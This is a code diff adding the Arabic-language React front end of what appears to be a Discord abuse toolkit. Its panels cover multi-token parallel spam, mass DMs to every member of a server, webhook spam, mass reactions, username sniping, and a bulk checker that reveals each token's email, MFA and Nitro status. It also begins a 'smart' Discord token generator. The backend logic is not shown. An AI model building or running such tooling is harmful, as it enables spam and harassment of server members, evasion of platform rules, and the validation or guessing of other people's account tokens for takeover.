+                <div className="flex gap-2 mb-4">{['auto', 'manual'].map(mode => (<button key={mode} onClick={() => setSniperMode(mode as any)} className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all cursor-pointer ${sniperMode === mode ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-black/20 text-green-600 hover:text-green-400 border border-transparent'}`}>{mode === 'auto' ? '🎲 تلقائي' : '✏️ يدوي'}</button>))}</div>
+                {sniperMode === 'auto' ? (<>
+                  <div className="grid grid-cols-2 gap-3 mb-4"><div><label className="text-[11px] text-green-300/70 mb-1 block">🔢 العدد</label><input type="number" value={sniperCount} onChange={e => setSniperCount(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div><div><label className="text-[11px] text-green-300/70 mb-1 block">📏 الطول</label><input type="number" value={sniperLength} onChange={e => setSniperLength(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div></div>
+                  <div className="mb-4"><label className="text-[11px] text-green-300/70 mb-2 block">🎨 نمط التوليد</label><div className="grid grid-cols-5 gap-1.5">{[{ id: 'random', label: 'عشوائي', icon: '🎲' }, { id: 'consonants', label: 'ساكنات', icon: '🔤' }, { id: 'numbers', label: 'أرقام', icon: '🔢' }, { id: 'dictionary', label: 'كلمات', icon: '📖' }, { id: 'rare', label: 'نادر', icon: '💎' }].map(p => (<button key={p.id} onClick={() => setSniperPattern(p.id)} className={`py-2 rounded-lg text-[10px] font-bold transition-all cursor-pointer text-center ${sniperPattern === p.id ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-black/20 text-green-600 hover:text-green-400 border border-transparent'}`}><span className="text-base block mb-0.5">{p.icon}</span>{p.label}</button>))}</div></div>
+                  <div className="flex gap-3 mb-4"><label className="flex items-center gap-2 text-xs text-emerald-300/80 bg-slate-800/50 px-3 py-2 rounded-lg border border-slate-700/20 cursor-pointer"><input type="checkbox" checked={useDot} onChange={e => setUseDot(e.target.checked)} className="accent-emerald-500" /> نقطة (.)</label><label className="flex items-center gap-2 text-xs text-emerald-300/80 bg-slate-800/50 px-3 py-2 rounded-lg border border-slate-700/20 cursor-pointer"><input type="checkbox" checked={useUnderscore} onChange={e => setUseUnderscore(e.target.checked)} className="accent-emerald-500" /> شرطة (_)</label></div>
+                </>) : (<div className="mb-4"><label className="text-[11px] text-green-300/70 mb-1 block">📝 اليوزرات (كل يوزر سطر)</label><textarea value={usernames} onChange={e => setUsernames(e.target.value)} placeholder={"username1\nusername2"} rows={4} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-green-700/30 focus:outline-none focus:border-green-400/50 resize-none font-mono transition-colors" /></div>)}
+                <ActionBtn text="🎯 بدء الفحص" loading={loading} onClick={async () => { const list = sniperMode === 'auto' ? Array.from({ length: sniperCount }, () => genUsername()) : usernames.split('\n').map(u => u.trim()).filter(Boolean); if (list.length === 0) { setResult('❌ أدخل يوزر واحد على الأقل'); return }; await api('sniper', { token: sniperToken, usernames: list, debug: true }) }} />
+                {sniperStats && (<div className="mt-4 grid grid-cols-4 gap-2 animate-fade-in"><div className="bg-green-500/8 rounded-xl p-2.5 border border-green-500/10 text-center"><div className="text-lg font-black text-green-400">{sniperStats.available}</div><div className="text-[9px] text-green-300/60">✅ متاح</div></div><div className="bg-red-500/8 rounded-xl p-2.5 border border-red-500/10 text-center"><div className="text-lg font-black text-red-400">{sniperStats.taken}</div><div className="text-[9px] text-red-300/60">❌ محجوز</div></div><div className="bg-yellow-500/8 rounded-xl p-2.5 border border-yellow-500/10 text-center"><div className="text-lg font-black text-yellow-400">{sniperStats.errors}</div><div className="text-[9px] text-yellow-300/60">⚠️ خطأ</div></div><div className="bg-blue-500/8 rounded-xl p-2.5 border border-blue-500/10 text-center"><div className="text-lg font-black text-blue-400">{sniperStats.rateLimitHits || 0}</div><div className="text-[9px] text-blue-300/60">⏳ RL</div></div></div>)}
+                {availableNames.length > 0 && (<div className="mt-4 bg-green-500/8 rounded-xl p-4 border border-green-500/20 animate-fade-in"><div className="flex items-center justify-between mb-2"><h3 className="font-bold text-green-400 text-sm">🏆 اليوزرات المتاحة! ({availableNames.length})</h3><button onClick={() => { navigator.clipboard.writeText(availableNames.join('\n')); setResult('📋 تم النسخ!') }} className="text-[10px] text-green-300 bg-green-500/15 px-2.5 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/25 cursor-pointer transition-colors">📋 نسخ الكل</button></div><div className="flex flex-wrap gap-1.5">{availableNames.map((name, i) => (<button key={i} onClick={() => { navigator.clipboard.writeText(name); setResult(`📋 تم نسخ: ${name}`) }} className="text-xs font-mono text-green-400 bg-green-500/10 px-2.5 py-1.5 rounded-lg border border-green-500/20 hover:bg-green-500/20 cursor-pointer transition-colors">{name} 📋</button>))}</div></div>)}
+                {sniperResults.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-green-500/15 animate-fade-in"><div className="flex items-center justify-between mb-3"><h3 className="font-bold text-green-400 text-sm">📊 النتائج ({sniperResults.length})</h3><button onClick={() => { const text = sniperResults.map(r => `${r.username} | ${r.status}${r.debug ? ' | ' + r.debug : ''}`).join('\n'); navigator.clipboard.writeText(text); setResult('📋 تم النسخ!') }} className="text-[10px] text-white/50 bg-white/5 px-2.5 py-1 rounded-lg border border-white/10 hover:bg-white/10 cursor-pointer transition-colors">📋 نسخ الكل</button></div><div className="space-y-1 max-h-72 overflow-auto">{sniperResults.map((r, i) => (<div key={i} className={`px-3 py-2 rounded-lg text-xs font-mono ${r.color === 'green' ? 'bg-green-500/15 text-green-400 border border-green-500/20' : r.color === 'red' ? 'bg-red-500/8 text-red-400/70 border border-red-500/10' : 'bg-yellow-500/8 text-yellow-400/70 border border-yellow-500/10'}`}><div className="flex justify-between items-center"><span className="cursor-pointer hover:underline" onClick={() => { navigator.clipboard.writeText(r.username); setResult(`📋 ${r.username}`) }}>{r.username}</span><span className="font-medium">{r.status}</span></div>{r.debug && <div className="text-[9px] opacity-60 mt-0.5">{r.debug}</div>}</div>))}</div></div>)}
+              </div></div>
+            )}
+
+            {/* ==================== MULTI-SPAM ==================== */}
+            {section === 'multi-spam' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-orange-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔥</span><h2 className="text-xl font-black text-orange-400">سبام بأكثر من توكن</h2></div>
+                <p className="text-slate-500 text-sm mb-5">⚡ أقوى سبام - عدة توكنات ترسل بالتوازي! حتى 15 رسالة في نفس الوقت</p>
+                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">🎫 التوكنات (كل توكن سطر - أكثر توكن = أسرع)</label><textarea value={multiSpamTokens} onChange={e => setMultiSpamTokens(e.target.value)} placeholder={"توكن 1\nتوكن 2\nتوكن 3"} rows={4} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none font-mono transition-colors" /></div>
+                <TextInput label="📺 أيدي الروم" value={msChannelId} onChange={setMsChannelId} placeholder="Channel ID" accent="orange" />
+                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">📝 الرسائل (كل سطر يرسل لوحده)</label><textarea value={msMessages} onChange={e => setMsMessages(e.target.value)} placeholder={"رسالة 1\nرسالة 2"} rows={3} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
+                <div className="grid grid-cols-2 gap-3 mb-5">
+                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={msDuration} onChange={e => setMsDuration(Number(e.target.value))} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
+                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={msSpeed} onChange={e => setMsSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
+                </div>
+                <div className="bg-orange-500/5 rounded-xl p-3 mb-5 border border-orange-500/10"><p className="text-[11px] text-orange-500/70 leading-relaxed">⚡ التزامن = توكنات × 2 (أقصى 15)<br />🔄 التوكنات تتناوب بالتساوي</p></div>
+                <ActionBtn text="🔥 بدء السبام المتعدد" loading={loading} color="orange" onClick={() => { const tokenList = multiSpamTokens.split('\n').map(t => t.trim()).filter(t => t.length >= 20); if (tokenList.length === 0) { setResult('❌ أدخل توكن واحد على الأقل'); return }; const msgList = msMessages.split('\n').map(m => m.trim()).filter(Boolean); if (msgList.length === 0) { setResult('❌ أدخل رسالة'); return }; api('multi-spam', { tokens: tokenList, channelId: msChannelId, messages: msgList, duration: msDuration, speed: msSpeed }) }} />
+              </div></div>
+            )}
+
+            {/* ==================== MASS DM ==================== */}
+            {section === 'mass-dm' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📧</span><h2 className="text-xl font-black text-purple-400">DM جماعي</h2></div>
+                <p className="text-slate-500 text-sm mb-5">إرسال رسالة خاصة لكل أعضاء سيرفر - 10 بالتوازي</p>
+                <TokenInput label="🎫 التوكن" value={massDmToken} onChange={setMassDmToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🏰 أيدي السيرفر" value={dmGuildId} onChange={setDmGuildId} placeholder="Guild ID" accent="purple" />
+                <div className="mb-4"><label className="text-[11px] text-purple-300/70 mb-1 block">💬 رسالة DM</label><textarea value={dmMessage} onChange={e => setDmMessage(e.target.value)} placeholder="اكتب رسالتك هنا..." rows={3} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-purple-700/30 focus:outline-none focus:border-purple-400/50 resize-none transition-colors" /></div>
+                <div className="mb-5"><label className="text-[11px] text-purple-300/70 mb-1 block">👥 الحد الأقصى للأعضاء</label><input type="number" value={dmMaxMembers} onChange={e => setDmMaxMembers(Number(e.target.value))} className="w-full bg-black/30 border border-purple-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-purple-400/50 transition-colors" /></div>
+                <ActionBtn text="📧 بدء الإرسال الجماعي" loading={loading} color="purple" onClick={() => { if (!dmMessage) { setResult('❌ أدخل الرسالة'); return }; api('mass-dm', { token: massDmToken, guildId: dmGuildId, message: dmMessage, maxMembers: dmMaxMembers }) }} />
+              </div></div>
+            )}
+
+            {/* ==================== LEAVER ==================== */}
+            {section === 'leaver' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🚪</span><h2 className="text-xl font-black text-red-400">مغادرة السيرفرات</h2></div>
+                <p className="text-slate-500 text-sm mb-5">مغادرة كل السيرفرات بضغطة واحدة - السيرفرات المملوكة تُتجنّب</p>
+                <TokenInput label="🎫 التوكن" value={leaverToken} onChange={setLeaverToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
+                <div className="grid grid-cols-2 gap-2.5 mb-5">
+                  <ActionBtn text="🚪 مغادرة الكل" loading={loading} color="red" onClick={() => api('leaver', { token: leaverToken, action: 'leave_all' })} />
+                  <ActionBtn text="📋 عرض السيرفرات" loading={loading} onClick={async () => { if (!leaverToken) { setResult('❌ أدخل التوكن'); return }; setLoading(true); setProgress('🔍 جلب السيرفرات...'); try { const res = await fetch('/api/leaver', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: leaverToken, action: 'list' }) }); const data = await res.json(); if (data.success) { setGuildList(data.guilds); setResult(`📋 لديك ${data.total} سيرفر`) } else { setResult(`❌ ${data.error}`) } } catch { setResult('❌ خطأ') }; setLoading(false); setProgress('') }} />
+                </div>
+                {guildList.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-red-500/15 animate-fade-in">
+                  <h3 className="font-bold text-red-400 text-sm mb-3">🏰 السيرفرات ({guildList.length})</h3>
+                  <div className="space-y-1 max-h-96 overflow-auto">{guildList.map((g, i) => (<div key={i} className="flex justify-between items-center px-3 py-2 rounded-lg text-xs bg-black/20 border border-white/5"><div><span className="text-white/80 font-medium">{g.name}</span>{g.owner && <span className="text-yellow-400 ml-2">👑 مالك</span>}</div><span className="text-white/40">{g.members || '?'} عضو</span></div>))}</div>
+                </div>)}
+              </div></div>
+            )}
+
+            {/* ==================== MASS REACT ==================== */}
+            {section === 'react' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-yellow-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎭</span><h2 className="text-xl font-black text-yellow-400">رياكشن جماعي</h2></div>
+                <p className="text-slate-500 text-sm mb-5">{reactMode === 'auto' ? '🔄 رياكشن تلقائي لكل رسالة جديدة' : 'وضع رياكشنات على رسائل - عدة إيموجيات بالتوازي'}</p>
+                <div className="mb-4">
+                  <label className="text-[11px] text-yellow-300/70 mb-1 block">🎫 التوكنات (توكن واحد لكل سطر)</label>
+                  <textarea value={reactToken} onChange={e => setReactToken(e.target.value)} placeholder={"توكن 1\nتوكن 2\nتوكن 3"} rows={3} className="w-full bg-black/30 border border-yellow-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-yellow-700/30 focus:outline-none focus:border-yellow-400/50 resize-none font-mono transition-colors" />
+                </div>
+                <TextInput label="📺 أيدي الروم" value={reactChannelId} onChange={setReactChannelId} placeholder="Channel ID" accent="yellow" />
+                <div className="flex gap-2 mb-4">{['manual', 'auto'].map(mode => (<button key={mode} onClick={() => setReactMode(mode as any)} className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all cursor-pointer ${reactMode === mode ? 'bg-yellow-500/20 text-yellow-400 border border-yellow-500/30' : 'bg-black/20 text-yellow-600 hover:text-yellow-400 border border-transparent'}`}>{mode === 'auto' ? '🔄 تلقائي' : '✏️ يدوي'}</button>))}</div>
+                <div className="mb-4"><label className="text-[11px] text-yellow-300/70 mb-1 block">🎭 الإيموجيات (مسافة بين كل واحد)</label><input type="text" value={reactEmoji} onChange={e => setReactEmoji(e.target.value)} placeholder="👍 ❤️ 🔥 🎉" className="w-full bg-black/30 border border-yellow-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-yellow-700/30 focus:outline-none focus:border-yellow-400/50 transition-colors" /></div>
+                {reactMode === 'manual' ? (
+                  <TextInput label="📩 أيدي رسالة محددة (اختياري)" value={reactMessageId} onChange={setReactMessageId} placeholder="Message ID (اتركه فاضي للرسائل الأخيرة)" accent="yellow" />
+                ) : (
+                  <div className="mb-4"><label className="text-[11px] text-yellow-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={reactDuration} onChange={e => setReactDuration(Number(e.target.value))} className="w-full bg-black/30 border border-yellow-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-yellow-400/50 transition-colors" /></div>
+                )}
+                <ActionBtn text={reactMode === 'auto' ? '🔄 بدء الرايكشن التلقائي' : '🎭 وضع رياكشنات'} loading={loading} color="yellow" onClick={() => { if (!reactEmoji) { setResult('❌ أدخل إيموجي واحد على الأقل'); return }; const tokenList = reactToken.split('\n').map(t => t.trim()).filter(t => t.length >= 20); if (tokenList.length === 0) { setResult('❌ أدخل توكن واحد على الأقل'); return }; api('mass-react', { tokens: tokenList, channelId: reactChannelId, emoji: reactEmoji, messageId: reactMessageId || undefined, mode: reactMode, duration: reactMode === 'auto' ? reactDuration : undefined }) }} />
+              </div></div>
+            )}
+
+            {/* ==================== TOKEN CHECKER ==================== */}
+            {section === 'checker' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔍</span><h2 className="text-xl font-black text-cyan-400">فحص توكنات متعددة</h2></div>
+                <p className="text-slate-500 text-sm mb-5">فحص مجموعة توكنات بالتوازي - 10 دفعات</p>
+                <div className="mb-4"><label className="text-[11px] text-cyan-300/70 mb-1 block">🎫 التوكنات (كل توكن سطر)</label><textarea value={checkerTokens} onChange={e => setCheckerTokens(e.target.value)} placeholder={"توكن 1\nتوكن 2\nتوكن 3"} rows={6} className="w-full bg-black/30 border border-cyan-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-cyan-700/30 focus:outline-none focus:border-cyan-400/50 resize-none font-mono transition-colors" /></div>
+                <ActionBtn text="🔍 فحص التوكنات" loading={loading} color="cyan" onClick={async () => { const list = checkerTokens.split('\n').map(t => t.trim()).filter(t => t.length >= 20); if (list.length === 0) { setResult('❌ أدخل توكن'); return }; await api('token-checker', { tokens: list }) }} />
+                {checkerStats && (<div className="mt-5 grid grid-cols-3 gap-2 animate-fade-in"><div className="bg-green-500/8 rounded-xl p-3 border border-green-500/10 text-center"><div className="text-xl font-black text-green-400">{checkerStats.valid}</div><div className="text-[10px] text-green-300/60">صالح ✅</div></div><div className="bg-red-500/8 rounded-xl p-3 border border-red-500/10 text-center"><div className="text-xl font-black text-red-400">{checkerStats.invalid}</div><div className="text-[10px] text-red-300/60">غير صالح ❌</div></div><div className="bg-cyan-500/8 rounded-xl p-3 border border-cyan-500/10 text-center"><div className="text-xl font-black text-cyan-400">{checkerStats.nitro}</div><div className="text-[10px] text-cyan-300/60">نيترو 💎</div></div></div>)}
+                {checkerResults.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-cyan-500/15 animate-fade-in"><h3 className="font-bold text-cyan-400 text-sm mb-3 text-center">📋 نتائج الفحص ({checkerResults.length})</h3><div className="space-y-2 max-h-96 overflow-auto">{checkerResults.map((r, i) => (<div key={i} className={`rounded-xl p-3 border ${r.valid ? 'bg-green-500/8 border-green-500/15' : 'bg-red-500/8 border-red-500/10'}`}><div className="flex justify-between items-center mb-1"><span className={`font-mono text-xs ${r.valid ? 'text-green-400' : 'text-red-400'}`}>{r.token}</span><span className="text-xs">{r.valid ? <span className={r.type === 'bot' ? 'text-blue-400' : 'text-purple-400'}>{r.type === 'bot' ? '🤖 بوت' : '👤 يوزر'}</span> : <span className="text-red-400">❌ {r.error || 'غير صالح'}</span>}</span></div>{r.valid && (<div className="grid grid-cols-2 gap-1 text-[10px]"><span className="text-cyan-300/70">👤 {r.name}</span><span className="text-cyan-300/70">🆔 {r.id}</span>{r.nitro && <span className="text-cyan-300/70">{r.nitro}</span>}{r.email && <span className="text-cyan-300/70">{r.email}</span>}{r.mfa && <span className="text-cyan-300/70">{r.mfa}</span>}{r.createdAt && r.createdAt !== 'N/A' && <span className="text-cyan-300/70">📅 {r.createdAt}</span>}</div>)}</div>))}</div></div>)}
+              </div></div>
+            )}
+
+            {/* ==================== WEBHOOK SPAM ==================== */}
+            {section === 'webhook-spam' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-pink-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔗</span><h2 className="text-xl font-black text-pink-400">ويب هوك سبام</h2></div>
+                <p className="text-slate-500 text-sm mb-5">إرسال رسائل عبر ويب هوك Discord بسرعة عالية - 10 رسائل بالتوازي</p>
+                <TokenInput label="🎫 التوكن (للتسجيل)" value={whSpamToken} onChange={setWhSpamToken} accent="pink" onHelp={() => setShowTokenGuide(true)} />
+                <div className="mb-4"><label className="text-[11px] text-pink-300/70 mb-1 block">🔗 رابط الويب هوك</label><input type="text" value={whSpamUrl} onChange={e => setWhSpamUrl(e.target.value)} placeholder="https://discord.com/api/webhooks/..." className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 transition-colors font-mono" /></div>
+                <div className="mb-4"><label className="text-[11px] text-pink-300/70 mb-1 block">💬 محتوى الرسالة</label><textarea value={whSpamMessage} onChange={e => setWhSpamMessage(e.target.value)} placeholder="اكتب رسالتك هنا..." rows={3} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 resize-none transition-colors" /></div>
+                <div className="grid grid-cols-2 gap-3 mb-4">
+                  <div><label className="text-[11px] text-pink-300/70 mb-1 block">🔢 العدد</label><input type="number" value={whSpamCount} onChange={e => setWhSpamCount(Number(e.target.value))} className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-pink-400/50 transition-colors" /></div>
+                  <div><label className="text-[11px] text-pink-300/70 mb-1 block">👤 اسم المرسل (اختياري)</label><input type="text" value={whSpamUsername} onChange={e => setWhSpamUsername(e.target.value)} placeholder="TRJ BOT" className="w-full bg-black/30 border border-pink-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-pink-700/30 focus:outline-none focus:border-pink-400/50 transition-colors" /></div>
+                </div>
+                <ActionBtn text="🔗 بدء السبام" loading={loading} color="pink" onClick={() => { if (!whSpamUrl || !whSpamUrl.includes('discord.com/api/webhooks')) { setResult('❌ أدخل رابط ويب هوك صالح'); return }; if (!whSpamMessage) { setResult('❌ أدخل الرسالة'); return }; api('webhook-spam', { token: whSpamToken, webhookUrl: whSpamUrl, message: whSpamMessage, count: whSpamCount, username: whSpamUsername || undefined }) }} />
+              </div></div>
+            )}
+
+            {/* ==================== VOICE ONLINE ==================== */}
+            {section === 'voice-online' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎤</span><h2 className="text-xl font-black text-purple-400">تثبيت فويس 24 ساعة</h2></div>
+                <p className="text-slate-500 text-sm mb-5">⚡ يبقى في روم الفويس لمدة 24 ساعة - إعادة اتصال تلقائية - يعمل في الخلفية</p>
+                <TokenInput label="🎫 التوكن" value={voiceToken} onChange={setVoiceToken} accent="purple" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🏰 أيدي السيرفر" value={voiceGuildId} onChange={setVoiceGuildId} placeholder="Guild ID" accent="purple" />
+                <TextInput label="🎤 أيدي روم الفويس" value={voiceChannelId} onChange={setVoiceChannelId} placeholder="Voice Channel ID" accent="purple" />
+                <div className="mb-4">
+                  <label className="text-[11px] text-purple-300/70 mb-2 block">⏱️ المدة</label>
+                  <div className="grid grid-cols-4 gap-2 mb-2">
+                    {[{ label: '1 ساعة', val: 3600 }, { label: '6 ساعات', val: 21600 }, { label: '12 ساعة', val: 43200 }, { label: '24 ساعة', val: 86400 }].map(p => (
+                      <button key={p.val} onClick={() => setVoiceDuration(p.val)} className={`py-2.5 rounded-xl text-[11px] font-bold transition-all cursor-pointer ${voiceDuration === p.val ? 'bg-purple-500/25 text-purple-300 border border-purple-500/40' : 'bg-black/20 text-purple-600 hover:text-purple-400 border border-transparent'}`}>{p.label}</button>
+                    ))}
+                  </div>
+                  <input type="number" value={voiceDuration} onChange={e => setVoiceDuration(Math.min(Math.max(Number(e.target.value), 60), 86400))} min={60} max={86400} className="w-full bg-black/30 border border-purple-500/30 rounded-lg px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-400/50 transition-colors" />
+                </div>
+                <ActionBtn text={voiceActive ? '⏹️ إيقاف التثبيت' : '🎤 تثبيت في الفويس'} loading={false} color="purple" onClick={() => {
+                  if (voiceActive) { stopVoiceAnchor(); setResult('⏹️ تم إيقاف التثبيت'); return }
+                  if (!voiceToken || !voiceGuildId || !voiceChannelId) { setResult('❌ أدخل التوكن + أيدي السيرفر + أيدي روم الفويس'); return }
+                  setVoiceActive(true); setVoiceSessionCount(1)
+                  setResult('🎤 جاري التثبيت...'); setProgress('')
+                  const totalSec = voiceDuration; let elapsed = 0
+                  setVoiceRemaining(totalSec >= 3600 ? `${Math.floor(totalSec/3600)}:${String(Math.floor((totalSec%3600)/60)).padStart(2,'0')}` : `${Math.floor(totalSec/60)}:${String(totalSec%60).padStart(2,'0')}`)
+                  // أول طلب - بدون انتظار (يأخذ 270 ثانية من السيرفر)
+                  fetch('/api/voice-online', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: voiceToken, guildId: voiceGuildId, channelId: voiceChannelId, duration: 270 }) }).catch(() => {})
+                  // كل 4 دقائق طلب جديد (fire & forget)
+                  voiceTimerRef.current = setInterval(() => {
+                    if (!document.visibilityState) return
+                    setVoiceSessionCount(c => c + 1)
+                    fetch('/api/voice-online', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: voiceToken, guildId: voiceGuildId, channelId: voiceChannelId, duration: 270 }) }).catch(() => {})
+                  }, 240000)
+                  // عداد تنازلي
+                  voiceCountdownRef.current = setInterval(() => {
+                    elapsed += 1; const rem = Math.max(totalSec - elapsed, 0)
+                    if (rem <= 0) { stopVoiceAnchor(); setResult('✅ انتهت مدة التثبيت!'); return }
+                    const h = Math.floor(rem/3600); const m = Math.floor((rem%3600)/60); const s = rem%60
+                    setVoiceRemaining(h > 0 ? `${h}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}` : `${m}:${String(s).padStart(2,'0')}`)
+                  }, 1000)
+                }} />
+                {voiceActive && <div className="mt-3 bg-purple-500/10 border border-purple-500/30 rounded-xl p-3 text-center">
+                  <div className="text-purple-300 text-sm font-bold">🎤 التثبيت يعمل الآن</div>
+                  <div className="text-purple-400/70 text-xs mt-1">الجلسات: {voiceSessionCount} | المتبقي: {voiceRemaining}</div>
+                  <div className="text-purple-500/40 text-[10px] mt-1">إعادة اتصال تلقائية كل 4 دقائق - أبقي التبويب مفتوح</div>
+                </div>}
+              </div></div>
+            )}
+
+            {/* ==================== SERVER INFO ==================== */}
+            {section === 'server-info' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📊</span><h2 className="text-xl font-black text-cyan-400">معلومات سيرفر</h2></div>
+                <p className="text-slate-500 text-sm mb-5">عرض معلومات مفصلة عن السيرفر - رتب، قنوات، إيموجي، بوتات، رابط، وأكثر</p>
+                <TokenInput label="🎫 التوكن" value={serverInfoToken} onChange={setServerInfoToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="🖥️ أيدي السيرفر" value={serverInfoGuildId} onChange={setServerInfoGuildId} placeholder="Server ID" accent="cyan" />
+                <ActionBtn text="📊 عرض المعلومات" loading={loading} color="cyan" onClick={async () => { if (!serverInfoToken || !serverInfoGuildId) { setResult('❌ أدخل التوكن + أيدي السيرفر'); return }; setLoading(true); setProgress('📊 جاري جلب المعلومات...'); setResult(''); try { const res = await fetch('/api/server-info', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: serverInfoToken, guildId: serverInfoGuildId }), signal: AbortSignal.timeout(60000) }); const data = await res.json(); if (data.success) { setResult(data.logs.join('\n')) } else { setResult('❌ ' + (data.error || 'فشل')) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} />
+              </div></div>
+            )}
+
+            {/* ==================== CHANNEL CLEAR ==================== */}
+            {section === 'channel-clear' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-cyan-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🧹</span><h2 className="text-xl font-black text-cyan-400">مسح رسائل</h2></div>
+                <p className="text-slate-500 text-sm mb-5">حذف عدد كبير من الرسائل من روم - بالتوازي و بسرعة</p>
+                <TokenInput label="🎫 التوكن" value={clearToken} onChange={setClearToken} accent="cyan" onHelp={() => setShowTokenGuide(true)} />
+                <TextInput label="📺 أيدي الروم" value={clearChannelId} onChange={setClearChannelId} placeholder="Channel ID" accent="cyan" />
+                <div className="mb-5"><label className="text-[11px] text-cyan-300/70 mb-1 block">🗑️ عدد الرسائل للحذف (max 1000)</label><input type="number" value={clearCount} onChange={e => setClearCount(Math.min(Number(e.target.value), 1000))} min={1} max={1000} className="w-full bg-black/30 border border-cyan-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-cyan-400/50 transition-colors" /></div>
+                <ActionBtn text="🧹 مسح الرسائل" loading={loading} color="cyan" onClick={() => { if (!clearToken || !clearChannelId) { setResult('❌ أدخل التوكن + أيدي الروم'); return }; api('channel-clear', { token: clearToken, channelId: clearChannelId, count: clearCount }) }} />
+              </div></div>
+            )}
+
+            {/* ==================== TOKEN GENERATOR ==================== */}
+            {section === 'token-generator' && (
+              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-purple-500/15 shadow-xl shadow-black/20">
+                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🎰</span><h2 className="text-xl font-black text-purple-400">توليد توكنات ذكي</h2></div>
+                <p className="text-slate-500 text-sm mb-5">توليد ذكي - بنية توكن Discord حقيقية - حدد العدد و تولّد</p>
+
